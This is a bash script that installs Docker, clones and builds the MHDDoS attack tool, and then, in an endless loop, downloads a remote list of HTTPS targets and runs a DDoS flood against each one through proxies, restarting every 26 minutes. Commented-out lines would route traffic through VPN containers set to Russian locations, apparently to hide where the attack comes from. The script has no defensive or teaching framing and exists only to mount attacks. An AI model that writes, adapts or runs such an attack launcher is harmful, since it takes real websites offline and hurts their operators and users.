#!/bin/bash -x

proxyFile="proxy1"

while getopts 'f:' flag; do
  case "${flag}" in
    f) fileName=${OPTARG};;
  esac
done

if [ -x "$(command -v docker)" ]; then
    echo "Docker installed"
else
    apt-get update
    echo "Install docker"
    apt-get update

    apt-get -y install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

    echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

  apt-get update

  apt-get -y install docker-ce docker-ce-cli containerd.io
fi

if [ ! -d "/root/MHDDoS" ]; then
  git clone https://github.com/MHProDev/MHDDoS.git
  cd /root/MHDDoS && touch proxy.txt && docker build -t mhddos_rv .
  cd ..
fi

while :
do

  # docker run --name vpn1 -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 -e WINDSCRIBE_FIREWALL=off --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
  # docker run --name vpn2 -e PUID=1001 -e PGID=1001 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 -e WINDSCRIBE_FIREWALL=off --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
  # sleep 1m

  wget -O list.txt $fileName
  myarray=(`cat list.txt`)
  noofelements=${#myarray[*]}
  counter=0
  randVpn="vpn1"
  while [ $counter -lt $noofelements ]
  do

    if [[ "${myarray[$counter]}" == https* ]]; then

        docker run -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 300 /app/$proxyFile.txt 200 1600 --debug

        if [ "$randVpn" == "vpn1" ]; then
            randVpn="vpn2"
        else
            randVpn="vpn1"
        fi
    fi
    counter=$(( $counter + 1 ))
  done

  sleep 26m

  docker rm -f $(docker ps -aq) >/dev/null 2>&1 || true
done
